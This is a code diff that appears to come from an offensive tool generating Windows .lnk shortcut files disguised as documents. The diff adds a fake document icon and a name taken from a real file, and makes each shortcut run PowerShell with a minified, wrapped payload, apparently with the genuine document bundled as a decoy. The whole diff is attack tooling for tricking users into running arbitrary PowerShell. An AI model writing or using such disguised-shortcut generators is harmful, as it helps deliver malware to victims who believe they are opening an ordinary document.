@@ -1,10 +1,13 @@
 import pylnk3
+from ps_minifier.psminifier import minify
+
 import argparse
 import sys
 import os
 
 from . import pylnk3_patch
 from . import path_operations
+from . import ps_wrapper
 
 class Document:
     def __init__(self, document_path=None):
@@ -35,19 +38,27 @@ class Document:
         self.icon_path = "C:\\Windows\\System32\\imageres.dll" # Contains generic Windows icons
         self.icon_index = 85 # Index within imageres.dll for document icon
 
-def write_lnk_using_document(target, document, arguments=None):
+def write_lnk_using_document(target, document, payload):
     try:
         lnk_name = os.path.basename(document.document_path) + ".lnk"
         delimiter = b"---LNK_DOCUMENT_BOUNDARY---"
+        script = minify(
+            ps_wrapper.wrap_powershell_script(
+                payload, 
+                path_operations.convert_to_os_specific_path(document.document_path), 
+                delimiter.decode("utf-8")
+            )
+        )
+        script_argument = ' -Command ' + script
 
         pylnk3.for_file(
             target_file=target,
             lnk_name=lnk_name,
-            arguments=arguments,
+            arguments=script_argument,
             description=None,
             icon_file=document.icon_path,
             icon_index=document.icon_index,
-            work_dir=path_operations.get_directory(document.document_path),
+            work_dir="%~dp0", # Directory of .lnk file
             window_mode=None,
         )
 
@@ -112,7 +123,7 @@ def main():
     else:
         payload = args.string
 
-    write_lnk_using_document(powershell_path, document, f' -Command {payload}')
+    write_lnk_using_document(powershell_path, document, payload)
 
 if __name__ == "__main__":
     main()
